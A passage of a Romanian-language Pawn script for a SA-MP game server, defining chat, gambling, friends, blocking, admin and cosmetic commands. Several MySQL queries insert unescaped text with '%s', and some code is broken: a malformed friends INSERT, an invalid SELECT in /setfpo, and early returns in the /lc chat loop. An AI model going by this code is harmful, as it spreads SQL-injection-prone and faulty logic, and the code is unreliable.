	if(PlayerInfo[playerid][pMuted]) return SendErrorMsg(playerid, "You can't talk right now! You are muted. (%d seconds)",PlayerInfo[playerid][pMuteTime]);
	
	extract params -> new string:text[128]; else return SendUsageMsg(playerid, "vc [text]");
	
	if(FaceReclama(text)) return Reclama(playerid, text);
	
	format(gString, 128, "%s%s{6792A1}: %s", Iter_Contains(Staff<ADMIN>, playerid) ? ("Admin {ff0000}") : PlayerInfo[playerid][pVip] == 1 ? ("VIP ") : ("VIP Plus {D4AF37}"), GetName(playerid), text);
	foreach(new i: All(PlayerVips)) if(togvip[i] == 0) sendSplittedMessageToPlayer(i, 0x6792A1FF, 0x6792A1FF, gString);
	DeelayCommand[playerid][8] = gettime() + 5;
	return true;
}

cmd:lc(playerid, params[]) {
	if(DeelayCommand[playerid][8] > gettime()) return DeelayTime(playerid, 8);
	if(PlayerInfo[playerid][pVip] != 3 && !PlayerInfo[playerid][pAdmin]) return SendErrorMsg(playerid, AdminOnly);
	if(togLegend[playerid]) return SendErrorMsg(playerid, "Chatul (/lc) este oprit din (/tog)!");
	if(PlayerInfo[playerid][pMuted]) return va_SendClientMessage(playerid, COLOR_GREY, "You can't talk right now! You are muted. (%d seconds)",PlayerInfo[playerid][pMuteTime]);
	extract params -> new string:text[128]; else return SendUsageMsg(playerid, "lc [text]");
	if(FaceReclama(text)) return Reclama(playerid, text);
	
	foreach(new i : Staff<ADMIN>) if(!togLegend[i]) return sendSplittedMessageToPlayer(i, 0x6e67a1FF, 0x6e67a1FF, "%s%s{6e67a1}: %s", Iter_Contains(Staff<ADMIN>, playerid) ? ("Admin {ff0000}") : ("Legend "), GetName(playerid), text);
	foreach(new i: PlayerVips<LEGEND>) {
		if(Iter_Contains(Staff<ADMIN>, i)) continue;
		if(!togLegend[i]) return sendSplittedMessageToPlayer(i, 0x6e67a1FF, 0x6e67a1FF, "%s%s{6e67a1}: %s", Iter_Contains(Staff<ADMIN>, playerid) ? ("Admin {ff0000}") : ("Legend "), GetName(playerid), text);
	}
	DeelayCommand[playerid][8] = gettime()+5;
	return true;
}

cmd:legendcolor(playerid) {
	if(PlayerInfo[playerid][pVip] != 3) return SendClientMessage(playerid, COLOR_LGREEN, "Nu ai Cont Legend.");

	ShowPlayerDialog(playerid, COLOR_LEGENDCOLOR, DIALOG_STYLE_INPUT, "SERVER: Legend Color", "Scrie mai jos culoarea numelui pe care vrei sa o ai. (EX: FFFFFF - ALB)\nSite recomandat: https://colorpicker.com/", "Select", "Cancel");
	return true;
}

cmd:pc(playerid, params[]) {
	if DeelayCommand[playerid][8]>gettime() *then 
		return DeelayTime(playerid, 8);

	if PlayerInfo[playerid][pPremiumAccount] == 0 && PlayerInfo[playerid][pAdmin] == 0 *then
		return true;
	
	if togpremium[playerid] *then
		return SendClientMessage(playerid, COLOR_WHITE, "Chatul (/pc) este oprit din (/tog)!");
	
	if PlayerInfo[playerid][pMuted] *then
		return SCMf(playerid, COLOR_GREY, "You can't talk right now! You are muted. (%d seconds)", PlayerInfo[playerid][pMuteTime]);	
	
	extract params -> new string:text[80]; else 
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/pc <text>");
	
	if FaceReclama(text) *then
		return Reclama(playerid, text);

	if(!IsAdmin(playerid, 1)) {
		switch(PlayerInfo[playerid][pPremiumAccount]) {
			case 1: format(gString, sizeof gString, "[PREMIUM] %s{ADCE6F}: %s", GetName(playerid), text);
			case 2: format(gString, sizeof gString, "[PREMIUM PLUS] {D4AF37}%s{ADCE6F}: %s", GetName(playerid), text);
		}
	} 
	else format(gString, sizeof gString, "[ADMIN] {FF0000}%s{ADCE6F}: %s", GetName(playerid), text);
	DeelayCommand[playerid][8] = gettime()+5;
	foreach(new i: PlayerPremiums) if(!togpremium[i]) sendSplittedMessageToPlayer(i, 0x89AA49FF, 0x89AA49FF, gString);
	return true;
}
cmd:dice(playerid, params[]) {
	if(!PlayerToPoint(150, playerid, 2229.7744,1606.8580,1006.1860)) return SendErrorMsg(playerid, "Nu te aflii intr-un casino.");
	extract params -> new player:userID, money; else return SendUsageMsg(playerid, "dice [id] [amount]");
	if(!IsPlayerConnected(userID)) return SendErrorMsg(playerid, "Acel player nu este conectat!");
	if(!IsPlayerLogged(userID)) return SendErrorMsg(playerid, "Acel player nu este logat!");
	if(!PlayerToPoint(150, userID, 2229.7744,1606.8580,1006.1860)) return SendErrorMsg(playerid, "Acel player nu este in casino!");
	if(PlayerInfo[playerid][pLevel] < 5) return SendErrorMsg(playerid, "Ai nevoie de level 5!");
	if(userID == playerid) return SendErrorMsg(playerid, "Nu poti folosi aceasta comanda asupra ta!");
	if(!(1000 <= money <= 50000000)) return SendErrorMsg(playerid, "Invalid Amount [1.000$ - 50.000.000$]");	
	if(GetPlayerCash(playerid) < money) return SendErrorMsg(playerid, "Nu ai destui bani!");
	if(GetPlayerCash(userID) < money) return SendErrorMsg(playerid, "Acest player nu are destui bani.");
	if(!ProxDetectorS(10.0, playerid, userID)) return SendErrorMsg(playerid, "Nu te esti langa acel jucator.");
	if(DiceMoney[userID] == playerid) return SendErrorMsg(playerid, "I-ai trimis deja o invitatie acestui player!");

	DiceMoney[userID] = money; DiceID[userID] = playerid;
	va_SendClientMessage(userID, 0xFAD4D4FF, "%s(%d) te-a invitat sa joci barbut cu el pe suma de $%s! (/accept dice %d).", GetName(playerid), playerid, FormatNumber(money), playerid);
	va_SendClientMessage(playerid, 0xFAD4D4FF, "L-ai invitat pe %s(%d) sa joace barbut cu tine pe suma de $%s.", GetName(userID), userID, FormatNumber(money));
	return true;
}
cmd:puthelmet(playerid, params[]) {
	if(!IsPlayerInAnyVehicle(playerid)) return true;
	if(!IsABike2(GetPlayerVehicleID(playerid))) return SendErrorMsg(playerid, "Nu iti poti pune casca in acest vehicul!");

	Helmet[playerid] = Helmet[playerid] == 0 ? 1 : 0;

	if(!Helmet[playerid]) return RemovePlayerAttachedObject(playerid, 3);
	SetPlayerAttachedObject(playerid, 3, 18645, 2, 0.101, -0.0, 0.0, 5.50, 84.60, 83.7, 1, 1, 1);
	return ProxDetector(15.0, playerid, "* %s %s casca de pe cap.", COLOR_PURPLE, GetName(playerid),Helmet[playerid] == 0 ? "si-a scos" : "si-a pus");
}

cmd:friends(playerid, params[]) return ShowPlayerFriends(playerid);

redist::ShowPlayerFriends(playerid) {
	gQuery[0] = (EOS);
	mysql_format(SQL, gQuery, 256, "SELECT f.ID, u.name, u.Status FROM friends f JOIN users u ON (u.id = f.friendID AND f.AddBy = %i) OR (u.id = f.AddBy AND f.friendID = %i) LIMIT 50", PlayerInfo[playerid][pSQLID], PlayerInfo[playerid][pSQLID]);
	mysql_tquery(SQL, gQuery, "SQL_cache_friends", "i", playerid);
	return true;
}

redist::SQL_cache_friends(playerid) {
	new onf; gString[0] = gQuery[0] = (EOS);
	strcat(gString, "{ffd736}[+] Add new friend{FFFFFF}\n");
	for(new i, j = cache_num_rows(),x; i != j; ++i) {
		cache_get_value_name(i, "name", Selected[playerid][x]);
		cache_get_value_name_int(i, "ID", Blocked[playerid][x]);
		cache_get_value_name_int(i, "Status", SelectedPlayers[playerid][x]);
		if(SelectedPlayers[playerid][x] != -1) format(gQuery, 60, "%s{FFFFFF} %s (%d)\n", !PlayerInfo[SelectedPlayers[playerid][x]][pSleeping]?("{1FA612}[online]"):("{F4D942}[sleeping]"), Selected[playerid][x], SelectedPlayers[playerid][x]), onf++;
		else format(gQuery,60, "{D60909}[offline]{FFFFFF} %s\n", Selected[playerid][x]);
		strcat(gString, gQuery);
		x++;
	}
	format(gQuery, 128, "Friends (%d/%d)", onf, cache_num_rows());
	ShowPlayerDialog(playerid, DIALOG_FRIENDS, DIALOG_STYLE_LIST, gQuery, gString, "Select", "Cancel");
	return true;
}

redist::sql_check_friend(playerid, id) {
	if(cache_num_rows()) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acel player se afla deja in lista ta de prieteni!");
	mysql_format(SQL, gQuery, 256, "INSERT INTO `friends` (`friendID`, `AddBy`) VALUES ('%i', '%s', %i')", PlayerInfo[playerid][pSQLID], PlayerInfo[id][pSQLID]);
	mysql_tquery(SQL, gQuery);
	SendClientMessage(playerid, COLOR_YELLOW, "Prieten adaugat!");
	SendClientMessage(id, COLOR_YELLOW, "Prieten adaugat!");
	finishAchievement(playerid, 3);
	finishAchievement(id, 3);
	return true;
}
						
cmd:setfpo(playerid, params[]) {
	if (PlayerInfo[playerid][pAdmin] < 5) return SendClientMessage(playerid, COLOR_WHITE, AdminOnly);
	new id[25], fp;
	if(sscanf(params, "s[25]i",id,fp)) return SendClientMessage(playerid,COLOR_GREY, "USAGE: {FFFFFF}/setfp <name> <FP>");

	mysql_format(SQL, gQuery, sizeof gQuery, "SELECT * FROM `users` WHERE `name` = '%s', `ID` as idfp LIMIT 1", id);
	mysql_tquery(SQL, gQuery, #cache_set_fpo, #isi, playerid, id, fp);
	return true;
}
redist::cache_set_fpo(playerid, const username[], fp) {
	new userid;
	cache_get_value_name_int(0, "Status", userid);
	if(userid != -1) PlayerInfo[userid][pFpunish] = fp;
	_query("UPDATE `users` SET `FPunish`='%d' WHERE `name`='%s'", fp, username);

	if(userid!=-1) ABroadcast(COLOR_LIGHTRED, 7, "(/setfpo): {FFFFFF}I-ai setat %d faction punish lui %s (online, id: %d).", fp, username, userid);
	else ABroadcast(COLOR_LIGHTRED, 7, "(/setfpo): {FFFFFF}I-ai setat %d faction punish lui %s (offline).", fp, username);
	return true;
}

cmd:blockcmd(playerid, const params[]) {
	if !IsAdmin(playerid, 7) *then
		return true;

	extract params -> new string:reason[128]; else
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/blockcmd <reason>");

	ShowPlayerDialog(playerid, DIALOG_BLOCKCMD, DIALOG_STYLE_INPUT, "{e80100}Block {FFFFFF}Command", "{FFFFFF}Scrie in casuta de mai jos comanda pe care vrei s-o blochezi:", "Select", "Cancel");
	SetPVarString(playerid, "Reason", reason);
	return true;
}

redist::cache_block_command(playerid, const command[]) {
	if cache_num_rows() *then
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Aceasta comanda este adaugata deja!");

	PC_SetFlags(command, true);
	_query("INSERT INTO `commands` (`name`) VALUES ('%s')", command);
	new reason[180];
	GetPVarString(playerid, "Reason", reason, sizeof(reason));
	SCMf(playerid, -1, "{db0000}>> COMMANDS (%d total) <<{FFFFFF} '%s' has been disabled, reason: %s.", cache_num_rows(), command, reason);
	return true;
}

cmd:removecmd(playerid, const params[]) {
	if !IsAdmin(playerid, 7) *then
		return true;

	extract params -> new string:command[32]; else
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/removecmd <cmd name>");

	mysql_format(SQL, gQuery, sizeof gQuery, "SELECT * FROM `commands` WHERE `name` = '%s' LIMIT 1", command);
	mysql_tquery(SQL, gQuery, #cache_command_unblock, #is, playerid, command);
	return true;
}

redist::cache_command_unblock(playerid, const command[]) {
	if !cache_num_rows() *then
		return SendClientMessage(playerid, COLOR_GREY, "EROARE: Aceasta comanda nu este inregistrata in baza de date!");

	PC_SetFlags(command, false);
	_query("DELETE FROM `commands` WHERE `name` = '%s'", command);
	SCMf(playerid, -1, "{db0000}>> COMMANDS <<{FFFFFF} '%d' has been activated.", command);
	return true;
}			

cmd:block(playerid, params[]) {
	if(!PlayerInfo[playerid][pPremiumAccount] && PlayerInfo[playerid][pVip])
		return true;

	new id;
	if(sscanf(params, "u",id)) 
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/block <playerid/name>");

	if(IsBlocked(playerid, id)) 
		return SendClientMessage(playerid, COLOR_GREY, "Acest player este deja blocat!");
	
	if(id == playerid) 
		return SendClientMessage(playerid, COLOR_LGREEN, "Nu poti folosi aceasta comanda asupra ta!");

	Iter_Add(player_in_blocks[playerid], id);
	SCMf(playerid, 0xFFBABAFF, "L-ai blocat pe %s (%d)! Acesta nu o sa te mai poate contacta pana la urmatoarea deconectare.", GetName(id), id);
	return true;
}
cmd:blocklist(playerid, params[]) {
	if(!PlayerInfo[playerid][pPremiumAccount] && PlayerInfo[playerid][pVip])
		return true;

	if(!Iter_Count(player_in_blocks[playerid])) 
		return SendClientMessage(playerid, -1, "Nu au fost gasiti playeri blocati!");

	SendClientMessage(playerid, -1, "-- Playeri blocati --");
	foreach(new i : player_in_blocks[playerid]) SCMf(playerid, -1, "%s (%d)", GetName(i), i);
	SCMf(playerid, COLOR_WHITE, "Au fost gasiti %d playeri.", Iter_Count(player_in_blocks[playerid]));
	return true;
}
	
cmd:unblock(playerid, params[]) {
	if(!PlayerInfo[playerid][pPremiumAccount] && PlayerInfo[playerid][pVip])
		return true;

	new id;
	if(sscanf(params, "u",id)) 
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/unblock <playerid/name>");

	if(!IsBlocked(playerid, id)) 
		return SendClientMessage(playerid, COLOR_GREY, "Acest player nu este blocat!");

	if(id == playerid) 
		return SendClientMessage(playerid, COLOR_LGREEN, "Nu poti folosi aceasta comanda asupra ta!");

	Iter_Remove(player_in_blocks[playerid], id);
	SCMf(playerid, 0xFFBABAFF, "L-ai deblocat pe %s (%d)! Acesta te poate contacta acum.", GetName(id), id);
	return true;
}
	
redist::IsBlocked(playerid, id) return bool:Iter_Contains(player_in_blocks[playerid], id);

cmd:systems(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] < 6) return true;
	new szDialog[1024], string[170];
	strcat(szDialog, "System name\tStatus\n");
	for(new i = 0; i < MAX_SYSTEMS; i++) {
		format(string, sizeof(string), "%d. %s\t%s\n", i+1, SystemName(i), (ServerSystem[i] == 0) ? ("{16DE00}Activated") : ("{FF0000}Dezactivated"));
		strcat(szDialog, string);	
	}
	ShowPlayerDialog(playerid, DIALOG_SYSTEMS, DIALOG_STYLE_TABLIST_HEADERS, "Server Systems", szDialog, "Select", "Exit");	
	return true;
}

stock SystemName(id) {
	new string[120];
	switch(id) {
		case 0: string = "Anti Armour Hack";
		case 1: string = "Anti Health Hack";
		case 2: string = "Auctions";
		case 3: string = "Tuning Hack";
		case 4: string = "Gift System";
		case 5: string = "Stage & Premium";
		case 6: string = "Rainbow";
		case 7: string = "Lotto System";
		case 8: string = "SOS Launch Control";
		case 9: string = "email";
		case 10: string = "IP Check";
		case 11: string = "Anti Armour Hack";
		case 12: string = "Slot Machine";
		case 13: string = "Anti Proxi/VPN";
	}
	return string;
}
cmd:editprice(playerid, params[]) {	
	new carid, price, szMessage[180];
	if(sscanf(params, "ii", carid, price)) return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/editprice <carid> <price>");
	if(PlayerInfo[playerid][pAdmin] >= 6)
	{
		DSModels[carid][dPrice] = price;
		format(szMessage, sizeof(szMessage), "* Ai schimbat pretul la vehiculul %d in %d.", carid, DSModels[carid][dPrice]);
		SendClientMessage(playerid, COLOR_YELLOW, szMessage);
		new szQuery[256];
		mysql_format(SQL, szQuery, sizeof(szQuery), "UPDATE dsveh SET `Price` = '%d' WHERE `ID` = '%d'",price, carid);
		mysql_tquery(SQL, szQuery, "", "");
	}
	return true;
}
redist::DisablePlayerCheckpointEx(playerid) {
	DisablePlayerCheckpoint(playerid);
	PlayerTextDrawHide(playerid, CpTDD);
	return true;
}

redist::DisablePlayerRaceCheckpointEx(playerid) {
	DisablePlayerRaceCheckpoint(playerid);
	PlayerTextDrawHide(playerid, CpTDD);
	return true;
}	
cmd:cw(playerid, params[]) {
    if !IsPlayerInAnyVehicle(playerid) *then return true;
	
	extract params -> new string:result[128]; else
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/cw <text>");

	if PlayerInfo[playerid][pMuted] *then
		return SCMf(playerid, COLOR_GREY, "You can't talk right now! You are muted. (%d seconds)",PlayerInfo[playerid][pMuteTime]);

	if(FaceReclama(result)) return Reclama(playerid, params);
	foreach(new i : VehOccupeid<GetPlayerVehicleID(playerid)>) va_SendClientMessage(i,COLOR_YELLOW, "(Car Whisper) %s: %s", GetName(playerid), params);
	ChatLog(playerid, "(car whisper) %s", result);		
    return true;
}
cmd:endlive(playerid, params[]) {
	if(PlayerInfo[playerid][pMember] != 9) return SendClientMessage(playerid, COLOR_GREY, "Nu faci parte din factiunea News Reporters.");
	if(TalkingLive[playerid] == -1) return true;
	SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Conversatie terminata.");
	SendClientMessage(TalkingLive[playerid], COLOR_LIGHTBLUE, "* Conversatie terminata.");
	TogglePlayerControllable(playerid, 1);
	TogglePlayerControllable(TalkingLive[playerid], 1);
	PlayerInfo[playerid][pChatCMD] =  0;
	PlayerInfo[TalkingLive[playerid]][pChatCMD] = 0;
	PlayerTextDrawHide(playerid, ChatCMD);
	PlayerTextDrawHide(TalkingLive[playerid], ChatCMD);
	TalkingLive[TalkingLive[playerid]] = -1;
	TalkingLive[playerid] = -1;
	AddFactionRaport(playerid, 1);
	Questions = 0;
	foreach(new i : logged_players) {
		if(Question[i] == 1) Question[i] = 0;
	}			
	return true;
}
cmd:live(playerid, params[]) {
	if PlayerInfo[playerid][pMember] != 9 *then 
		return SendClientMessage(playerid, COLOR_GREY, "Nu faci parte din factiunea News Reporters.");

	if TalkingLive[playerid] != -1 *then 
		return SendClientMessage(playerid, COLOR_GREY, "Esti deja intr-un live.");

	if PlayerInfo[playerid][pRank] < 3 *then 
		return SendClientMessage(playerid, -1, "Trebuie sa ai minim rank 3 pentru a da live!");

	extract params -> new player:id; else
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/live <playerid/name>");

	if !IsPlayerConnected(id) *then 
		return SendClientMessage(playerid, COLOR_GREY, "That user is not connected.");

	if !ProxDetectorS(5.0, playerid, id) *then 
		return SendClientMessage(playerid, -1, "Acel player nu este langa tine.");

	new hour,minute,second; gettime(hour,minute,second);
	if hour >= 00 && hour < 8 *then 
		return SendClientMessage(playerid, COLOR_LIGHTRED, "Nu poti folosi aceasta comanda in intervalul 00-08.");

	if id == playerid *then 
		return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi aceasta comanda asupra ta!");

	if(GetPlayerCash(id) < 1000000*PlayerInfo[id][pLevel])
		return SCMf(playerid, COLOR_LGREEN, "Eroare: Acel jucator nu detine suma de $%s.", FormatNumber(1000000*PlayerInfo[id][pLevel]));

	format(gString, sizeof(gString), "# %s is about to interview with: %s. ", GetName(playerid), GetName(id));
	SendFactionMessage(9, COLOR_LIGHTBLUE, gString);
	SCMf(playerid, COLOR_LIGHTBLUE, "* I-ai oferit lui %s o conversatie Live.", GetName(id));
	SCMf(id, COLOR_LIGHTBLUE, "* %s ti-a oferit o conversatie live. (/accept live %d) pentru a accepta.", GetName(playerid),playerid);
	LiveOffer[id] = playerid;
	return true;
}
redist::PutHat(playerid) {
	new model = PlayerInfo[playerid][pHat];
	switch(PlayerInfo[playerid][pModel]) {
		case 1: SetPlayerAttachedObject( playerid, 1, model, 2, 0.138505, 0.001595, -0.003624, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 1
		case 2: SetPlayerAttachedObject( playerid, 1, model, 2, 0.158120, 0.001595, -0.003624, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 3
		case 3: SetPlayerAttachedObject( playerid, 1, model, 2, 0.158120, 0.001595, -0.003624, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 3
		case 4: SetPlayerAttachedObject( playerid, 1, model, 2, 0.217011, 0.001595, -0.003624, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 4
		case 5: SetPlayerAttachedObject( playerid, 1, model, 2, 0.197443, 0.001595, -0.003624, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 5
		case 6: SetPlayerAttachedObject( playerid, 1, model, 2, 0.197443, 0.001595, -0.003624, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 6
		case 7: SetPlayerAttachedObject( playerid, 1, model, 2, 0.166039, 0.001595, -0.003624, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 7
		case 8: SetPlayerAttachedObject( playerid, 1, model, 2, 0.166039, 0.001595, -0.003624, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 8
		case 9: SetPlayerAttachedObject( playerid, 1, model, 2, 0.137042, 0.003905, -0.003624, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 9
		case 10: SetPlayerAttachedObject( playerid, 1, model, 2, 0.137042, 0.003905, -0.003624, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 10
		case 11: SetPlayerAttachedObject( playerid, 1, model, 2, 0.137042, 0.003905, -0.003624, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 11
		case 12: SetPlayerAttachedObject( playerid, 1, model, 2, 0.169248, 0.003905, -0.003624, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 12
		case 13: SetPlayerAttachedObject( playerid, 1, model, 2, 0.169248, 0.003905, -0.003624, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 13
		case 14: SetPlayerAttachedObject( playerid, 1, model, 2, 0.176461, 0.003905, -0.003624, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 14
		case 15: SetPlayerAttachedObject( playerid, 1, model, 2, 0.135116, -0.028391, -0.003624, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 15
		case 16: SetPlayerAttachedObject( playerid, 1, model, 2, 0.135116, -0.028391, -0.003624, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 16
		case 17: SetPlayerAttachedObject( playerid, 1, model, 2, 0.176750, -0.005152, 0.003589, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 17
		case 18: SetPlayerAttachedObject( playerid, 1, model, 2, 0.137032, -0.005152, 0.003589, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 18
		case 19: SetPlayerAttachedObject( playerid, 1, model, 2, 0.137032, -0.005152, 0.003589, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 19
		case 20: SetPlayerAttachedObject( playerid, 1, model, 2, 0.169844, -0.005152, 0.003589, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // HatBoater2 - 
		case 21: SetPlayerAttachedObject( playerid, 1, model, 2, 0.169844, -0.005152, 0.003589, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 21
		case 22: SetPlayerAttachedObject( playerid, 1, model, 2, 0.169844, -0.005152, 0.003589, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 22
		case 23: SetPlayerAttachedObject( playerid, 1, model, 2, 0.169844, -0.005152, 0.003589, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 23
		case 24: SetPlayerAttachedObject( playerid, 1, model, 2, 0.169844, -0.005152, 0.003589, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 24
		case 25: SetPlayerAttachedObject( playerid, 1, model, 2, 0.153401, 0.006404, 0.003589, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 25
		case 26: SetPlayerAttachedObject( playerid, 1, model, 2, 0.153401, 0.006404, 0.003589, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 26
		case 27: SetPlayerAttachedObject( playerid, 1, model, 2, 0.153401, 0.006404, 0.003589, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 27
		case 28: SetPlayerAttachedObject( playerid, 1, model, 2, 0.178765, 0.006345, -0.014876, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 28
		case 29: SetPlayerAttachedObject( playerid, 1, model, 2, 0.178765, 0.006345, -0.014876, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 29
		case 30: SetPlayerAttachedObject( playerid, 1, model, 2, 0.178310, 0.009442, 0.000530, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 30
		case 31: SetPlayerAttachedObject( playerid, 1, model, 2, 0.178310, 0.009442, 0.000530, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 31
		case 32: SetPlayerAttachedObject( playerid, 1, model, 2, 0.178310, 0.009442, 0.000530, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 32
		case 33: SetPlayerAttachedObject( playerid, 1, model, 2, 0.178310, 0.009442, 0.000530, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 33
		case 34: SetPlayerAttachedObject( playerid, 1, model, 2, 0.178310, 0.009442, 0.000530, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 34
		case 35: SetPlayerAttachedObject( playerid, 1, model, 2, 0.178310, 0.009442, 0.000530, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 35
		case 36: SetPlayerAttachedObject( playerid, 1, model, 2, 0.178310, 0.009442, 0.000530, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 36
		case 37: SetPlayerAttachedObject( playerid, 1, model, 2, 0.178310, 0.009442, 0.000530, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 37
		case 38: SetPlayerAttachedObject( playerid, 1, model, 2, 0.178310, 0.009442, 0.000530, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 38
		case 39: SetPlayerAttachedObject( playerid, 1, model, 2, 0.137954, -0.002958, 0.000530, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 39
		case 40: SetPlayerAttachedObject( playerid, 1, model, 2, 0.148416, -0.002958, 0.000530, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 40
		case 41: SetPlayerAttachedObject( playerid, 1, model, 2, 0.148416, -0.002958, 0.000530, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 41
		case 42: SetPlayerAttachedObject( playerid, 1, model, 2, 0.148416, -0.002958, 0.000530, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 42
		case 43: SetPlayerAttachedObject( playerid, 1, model, 2, 0.092380, -0.002958, 0.000530, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 43
		case 44: SetPlayerAttachedObject( playerid, 1, model, 2, 0.118452, 0.014299, 0.000530, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 44
		case 45: SetPlayerAttachedObject( playerid, 1, model, 2, 0.133399, -0.000648, 0.000530, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 45
		case 46: SetPlayerAttachedObject( playerid, 1, model, 2, 0.161029, 0.014299, 0.000530, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 46
		case 47: SetPlayerAttachedObject( playerid, 1, model, 2, 0.174838, 0.005146, 0.000530, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 47
		case 48: SetPlayerAttachedObject( playerid, 1, model, 2, 0.185725, -0.002868, -0.008738, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 48
		case 49: SetPlayerAttachedObject( playerid, 1, model, 2, 0.140534, 0.011140, -0.008738, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 49
		case 50: SetPlayerAttachedObject( playerid, 1, model, 2, 0.179763, -0.020149, -0.008738, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 50
		case 51: SetPlayerAttachedObject( playerid, 1, model, 2, 0.179763, -0.020149, -0.008738, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 51
		case 52: SetPlayerAttachedObject( playerid, 1, model, 2, 0.179763, -0.020149, -0.008738, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 52
		case 53: SetPlayerAttachedObject( playerid, 1, model, 2, 0.179763, -0.020149, -0.008738, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 53
		case 54: SetPlayerAttachedObject( playerid, 1, model, 2, 0.174966, 0.024967, 0.009581, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 54
		case 55: SetPlayerAttachedObject( playerid, 1, model, 2, 0.163809, -0.018255, 0.009581, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 55
		case 56: SetPlayerAttachedObject( playerid, 1, model, 2, 0.163809, -0.018255, 0.009581, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 56
		case 57: SetPlayerAttachedObject( playerid, 1, model, 2, 0.197187, -0.000997, 0.009581, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 57
		case 58: SetPlayerAttachedObject( playerid, 1, model, 2, 0.136419, 0.006264, -0.002492, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 58
